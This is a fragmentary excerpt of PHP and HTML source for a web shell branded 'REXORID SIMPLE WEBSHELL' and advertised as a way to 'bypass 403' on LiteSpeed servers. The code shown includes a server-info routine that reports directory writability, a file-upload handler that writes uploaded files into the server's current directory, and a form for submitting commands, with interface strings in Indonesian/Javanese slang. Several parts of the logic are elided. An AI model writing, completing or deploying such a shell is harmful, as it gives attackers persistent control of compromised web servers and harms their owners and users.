...
function serverinfo(){
    $output[] = "Dir Nang Kene (".writeable(path(), perms(path())).") ";
...
if (isset($_POST['upload'])) {
    ...
    if (!in_array($file_ext, $allowed_extensions)) {
        $errors[] = "Hanya file gambar yang diizinkan cok! (jpg, jpeg, png, gif).";
    }
    if (empty($errors)) {
        if (@copy($_FILES['file']['tmp_name'], path() . DIRECTORY_SEPARATOR . $_FILES['file']['name'])) {
            $act = color(1, 2, "Wes Teruploaded!") . " at <i><b>" . path() . DIRECTORY_SEPARATOR . $_FILES['file']['name'] . "</b></i>";
        } else {
            $act = color(1, 1, "Gagal Upload Cok!");
        }
    } else {
...
<head>
    ...
    <title>REXORID SIMPLE WEBSHELL</title>
    <link rel="shortcut icon" href="https://imagizer.imageshack.com/img924/2406/bJm6Qi.png" type="image/x-icon">
    <meta name="description" content="BYPASS 403 LIETSPEED">
    <meta name="og:description" content="BYPASS 403 LIETSPEED">
    <meta name="title" content="REXORID | SIMPLE WEBSHELL">
    <meta name="og:title" content="REXORID | SIMPLE WEBSHELL">
...
<body>
    <img src="https://imagizer.imageshack.com/img924/2406/bJm6Qi.png" alt="REXORID">
    <form action="" method="POST" enctype="multipart/form-data"
        style="font-size: medium;color: white;margin-top: 10px;">
        <b>REXORID SIMPLE WEBSHELL</b><br>
    ...
    <form method="POST" action=""><br>
        ...
        <input type="submit" name="submit" value="MLAYU!" id="run">
    </form>
    <?php if (isset($output)) : ?>
